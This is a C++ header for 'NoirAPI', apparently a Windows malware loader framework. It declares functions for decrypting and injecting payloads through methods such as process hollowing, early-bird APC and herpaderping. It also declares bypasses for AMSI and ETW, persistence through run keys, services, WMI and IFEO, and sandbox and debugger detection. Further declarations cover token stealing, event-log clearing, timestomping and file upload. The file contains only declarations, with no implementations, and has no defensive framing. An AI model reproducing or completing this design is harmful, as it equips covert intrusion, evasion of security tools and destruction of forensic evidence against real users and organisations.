#pragma once
#include <Windows.h>
#include <vector>
#include <string>
#include <functional>
#include <memory>

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS(NTAPI* _NtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, ULONG);
typedef NTSTATUS(NTAPI* _RtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE);

enum CRYPTO_MODE {
    CRYPTO_AES_CBC,
    CRYPTO_XOR,
    CRYPTO_RC4,
    CRYPTO_CUSTOM
};

enum INJECTION_METHOD {
    INJECT_CREATEREMOTE,
    INJECT_APC,
    INJECT_EARLYBIRD,
    INJECT_THREADHIJACK,
    INJECT_PROCESSHOLLOWING,
    INJECT_MODULESTOMPING,
    INJECT_HERPADERPING
};

enum BYPASS_TYPE {
    BYPASS_AMSI,
    BYPASS_ETW,
    BYPASS_WLDP,
    BYPASS_WFP,
    BYPASS_NSI,
    BYPASS_CALLBACK,
    BYPASS_HARDWARE
};

enum PERSISTENCE_TYPE {
    PERSIST_RUNKEY,
    PERSIST_STARTUP,
    PERSIST_SCHEDTASK,
    PERSIST_SERVICE,
    PERSIST_WMI,
    PERSIST_COM,
    PERSIST_IFEO
};

class NoirAPI {
private:
    static NoirAPI* instance;
    bool initialized;
    bool bypassesApplied;
    std::vector<BYTE> payload;
    std::string encryptionKey;
    _NtAllocateVirtualMemory NtAllocateVirtualMemory;
    _NtProtectVirtualMemory NtProtectVirtualMemory;
    _NtWriteVirtualMemory NtWriteVirtualMemory;
    _NtCreateThreadEx NtCreateThreadEx;
    _NtQueueApcThread NtQueueApcThread;
    _RtlCreateUserThread RtlCreateUserThread;

    bool LoadNativeAPIs();
public:
    static NoirAPI* Get();

    bool Initialize(const std::vector<BYTE>& encryptedPayload = {},
        const std::string& key = "");
    void Shutdown();

    bool ApplyBypasses(const std::vector<BYPASS_TYPE>& bypasses = {});
    bool ApplyAllBypasses();

    bool SetPayload(const std::vector<BYTE>& data);
    bool LoadPayloadFromFile(const std::wstring& path);
    bool LoadPayloadFromResource(int resourceId);
    bool DecryptPayload(CRYPTO_MODE mode = CRYPTO_AES_CBC);

    bool ExecuteLocally();
    bool ExecuteInProcess(DWORD pid, INJECTION_METHOD method = INJECT_CREATEREMOTE);
    bool ExecuteInNewProcess(const std::wstring& processPath = L"notepad.exe",
        INJECTION_METHOD method = INJECT_EARLYBIRD);

    DWORD FindProcess(const std::wstring& processName);
    bool IsProcess64Bit(DWORD pid);
    std::vector<DWORD> FindProcesses(const std::wstring& processName);

    bool InstallPersistence(PERSISTENCE_TYPE type, const std::wstring& path = L"");
    bool InstallMultiplePersistence(const std::vector<PERSISTENCE_TYPE>& types);
    bool RemovePersistence();

    bool CheckEnvironment();
    bool IsDebugged();
    bool IsVirtualMachine();
    bool IsSandboxed();

    std::vector<BYTE> EncryptData(const std::vector<BYTE>& data, CRYPTO_MODE mode);
    std::vector<BYTE> DecryptData(const std::vector<BYTE>& data, CRYPTO_MODE mode);
    std::string Base64Encode(const std::vector<BYTE>& data);
    std::vector<BYTE> Base64Decode(const std::string& encoded);

    LPVOID AllocateMemory(HANDLE process, SIZE_T size, DWORD protection = PAGE_EXECUTE_READWRITE);
    bool FreeMemory(HANDLE process, LPVOID address);
    bool WriteMemory(HANDLE process, LPVOID address, const std::vector<BYTE>& data);
    std::vector<BYTE> ReadMemory(HANDLE process, LPVOID address, SIZE_T size);

    HMODULE GetModuleFromDisk(const std::wstring& moduleName);
    bool UnhookModule(const std::wstring& moduleName);
    LPVOID GetExportAddress(HMODULE module, const std::string& functionName);

    NTSTATUS SyscallAllocateVirtualMemory(HANDLE process, PVOID* address, ULONG_PTR zeroBits,
        PSIZE_T size, ULONG allocationType, ULONG protect);
    NTSTATUS SyscallProtectVirtualMemory(HANDLE process, PVOID* address, PSIZE_T size,
        ULONG newProtect, PULONG oldProtect);
    NTSTATUS SyscallCreateThread(HANDLE process, PVOID startAddress, PVOID parameter);

    void SetEncryptionKey(const std::string& key);
    void SetSleepTime(DWORD milliseconds);
    void SetStealthMode(bool enabled);

    bool IsInitialized() const { return initialized; }
    bool AreBypassesApplied() const { return bypassesApplied; }
    size_t GetPayloadSize() const { return payload.size(); }

    typedef std::function<void(const std::string&)> LogCallback;
    typedef std::function<bool()> CheckCallback;
    void SetLogCallback(LogCallback callback);
    void SetPreExecuteCallback(CheckCallback callback);
    void SetPostExecuteCallback(CheckCallback callback);
private:
    LogCallback logCallback;
    CheckCallback preExecuteCallback;
    CheckCallback postExecuteCallback;
    void Log(const std::string& message);
    NoirAPI();
    ~NoirAPI();
    NoirAPI(const NoirAPI&) = delete;
    NoirAPI& operator=(const NoirAPI&) = delete;
};

#define NOIR_INIT() NoirAPI::Get()->Initialize()
#define NOIR_BYPASS() NoirAPI::Get()->ApplyAllBypasses()
#define NOIR_EXECUTE(pid) NoirAPI::Get()->ExecuteInProcess(pid)
#define NOIR_PERSIST() NoirAPI::Get()->InstallMultiplePersistence({PERSIST_RUNKEY, PERSIST_STARTUP})

namespace NoirUtils {
    std::vector<BYTE> StringToBytes(const std::string& str);
    std::string BytesToString(const std::vector<BYTE>& bytes);
    std::wstring StringToWide(const std::string& str);
    std::string WideToString(const std::wstring& wstr);

    DWORD GetProcessIdByName(const std::wstring& name);
    bool IsElevated();
    bool DisableWow64Redirection();

    std::string GetSystemInfo();
    std::string GetNetworkInfo();
    std::vector<std::wstring> GetRunningProcesses();

    bool CreateMutex(const std::wstring& name);
    bool CheckMutex(const std::wstring& name);

    std::vector<BYTE> DownloadFile(const std::string& url);
    bool UploadFile(const std::string& url, const std::vector<BYTE>& data);

    bool ClearEventLogs();
    bool DeletePrefetch();
    bool TimestompFile(const std::wstring& path);

    std::string GetMachineGUID();
    std::string GetVolumeSerial();
}

namespace NoirMemory {
    LPVOID PatternScan(LPVOID start, SIZE_T size, const std::vector<BYTE>& pattern, const std::string& mask);
    LPVOID PatternScanModule(const std::wstring& moduleName, const std::vector<BYTE>& pattern, const std::string& mask);

    bool PatchMemory(LPVOID address, const std::vector<BYTE>& patch);
    bool HookFunction(LPVOID target, LPVOID hook, std::vector<BYTE>& originalBytes);
    bool UnhookFunction(LPVOID target, const std::vector<BYTE>& originalBytes);

    bool CreateTrampoline(LPVOID target, LPVOID hook, LPVOID& trampoline);
    bool RemoveTrampoline(LPVOID trampoline);

    bool IsMemoryReadable(LPVOID address, SIZE_T size);
    bool IsMemoryWritable(LPVOID address, SIZE_T size);
    bool IsMemoryExecutable(LPVOID address, SIZE_T size);

    bool ChangeMemoryProtection(LPVOID address, SIZE_T size, DWORD newProtect, DWORD* oldProtect = nullptr);
    bool EncryptMemoryRegion(LPVOID address, SIZE_T size, const std::vector<BYTE>& key);
    bool DecryptMemoryRegion(LPVOID address, SIZE_T size, const std::vector<BYTE>& key);
}

namespace NoirCrypto {
    std::vector<BYTE> AESEncrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key, const std::vector<BYTE>& iv);
    std::vector<BYTE> AESDecrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key, const std::vector<BYTE>& iv);

    std::vector<BYTE> XOREncrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key);
    std::vector<BYTE> XORDecrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key);

    std::vector<BYTE> RC4Encrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key);
    std::vector<BYTE> RC4Decrypt(const std::vector<BYTE>& data, const std::vector<BYTE>& key);

    std::vector<BYTE> GenerateKey(size_t length = 32);
    std::vector<BYTE> GenerateIV(size_t length = 16);

    std::string HashString(const std::string& input);
    std::vector<BYTE> HashData(const std::vector<BYTE>& data);

    bool SecureZeroMemory(LPVOID address, SIZE_T size);
}

namespace NoirNetwork {
    bool CheckInternetConnection();
    std::string GetPublicIP();
    std::vector<std::string> GetDNSServers();

    bool PortScan(const std::string& host, int port);
    std::vector<int> ScanPorts(const std::string& host, const std::vector<int>& ports);

    bool HTTPGet(const std::string& url, std::string& response);
    bool HTTPPost(const std::string& url, const std::string& data, std::string& response);

    bool DNSQuery(const std::string& domain, std::string& result);
    bool ICMPPing(const std::string& host);

    bool CreateSocket(int& sock);
    bool CloseSocket(int sock);
    bool BindSocket(int sock, int port);
}

namespace NoirProcess {
    bool CreateProcessSuspended(const std::wstring& path, PROCESS_INFORMATION& pi);
    bool ResumeProcess(PROCESS_INFORMATION& pi);
    bool TerminateProcess(PROCESS_INFORMATION& pi);

    bool SetProcessToken(DWORD pid, HANDLE token);
    bool StealToken(DWORD sourcePid, DWORD targetPid);

    bool EnablePrivilege(const std::wstring& privilege);
    bool DisablePrivilege(const std::wstring& privilege);

    bool IsProcessProtected(DWORD pid);
    bool BypassProcessProtection(DWORD pid);

    std::vector<HANDLE> GetProcessHandles(DWORD pid);

    bool DumpProcessMemory(DWORD pid, const std::wstring& outputFile);
    bool ExtractStringsFromMemory(DWORD pid, const std::wstring& outputFile);
}

namespace NoirRegistry {
    bool CreateKey(HKEY root, const std::wstring& path);
    bool DeleteKey(HKEY root, const std::wstring& path);

    bool SetValue(HKEY root, const std::wstring& path, const std::wstring& name,
        DWORD type, const std::vector<BYTE>& data);
    bool GetValue(HKEY root, const std::wstring& path, const std::wstring& name,
        DWORD& type, std::vector<BYTE>& data);

    bool DeleteValue(HKEY root, const std::wstring& path, const std::wstring& name);

    std::vector<std::wstring> EnumKeys(HKEY root, const std::wstring& path);
    std::vector<std::wstring> EnumValues(HKEY root, const std::wstring& path);

    bool BackupKey(HKEY root, const std::wstring& path, const std::wstring& backupFile);
    bool RestoreKey(HKEY root, const std::wstring& path, const std::wstring& backupFile);
}

namespace NoirFileSystem {
    bool FileExists(const std::wstring& path);
    bool DirectoryExists(const std::wstring& path);

    std::vector<BYTE> ReadFile(const std::wstring& path);
    bool WriteFile(const std::wstring& path, const std::vector<BYTE>& data, bool append = false);

    bool DeleteFile(const std::wstring& path);
    bool CopyFile(const std::wstring& source, const std::wstring& destination);
    bool MoveFile(const std::wstring& source, const std::wstring& destination);

    bool HideFile(const std::wstring& path);
    bool UnhideFile(const std::wstring& path);

    bool SetFileTime(const std::wstring& path, FILETIME creation, FILETIME access, FILETIME modify);
    bool GetFileTime(const std::wstring& path, FILETIME& creation, FILETIME& access, FILETIME& modify);

    std::vector<std::wstring> ListFiles(const std::wstring& directory, const std::wstring& pattern = L"*");
    std::vector<std::wstring> ListDirectories(const std::wstring& directory);

    bool CreateDirectory(const std::wstring& path);
    bool DeleteDirectory(const std::wstring& path, bool recursive = true);

    std::wstring GetCurrentDirectory();
    bool SetCurrentDirectory(const std::wstring& path);

    std::wstring GetTempPath();
    std::wstring CreateTempFile(const std::wstring& prefix = L"tmp", const std::wstring& extension = L"tmp");
    std::wstring CreateTempDirectory(const std::wstring& prefix = L"tmp");
}

namespace NoirEvents {
    void LogInfo(const std::string& message);
    void LogWarning(const std::string& message);
    void LogError(const std::string& message);
    void LogDebug(const std::string& message);

    bool SetupLogging(const std::wstring& logFile = L"");
    bool TeardownLogging();

    void SetLogLevel(int level); 
    void EnableConsoleOutput(bool enable);
}

namespace NoirConfig {
    bool LoadConfig(const std::wstring& path);
    bool SaveConfig(const std::wstring& path);

    std::string GetString(const std::string& key, const std::string& defaultValue = "");
    int GetInt(const std::string& key, int defaultValue = 0);
    bool GetBool(const std::string& key, bool defaultValue = false);
    std::vector<std::string> GetArray(const std::string& key);

    void SetString(const std::string& key, const std::string& value);
    void SetInt(const std::string& key, int value);
    void SetBool(const std::string& key, bool value);
    void SetArray(const std::string& key, const std::vector<std::string>& values);

    bool HasKey(const std::string& key);
    void RemoveKey(const std::string& key);
    void ClearConfig();
}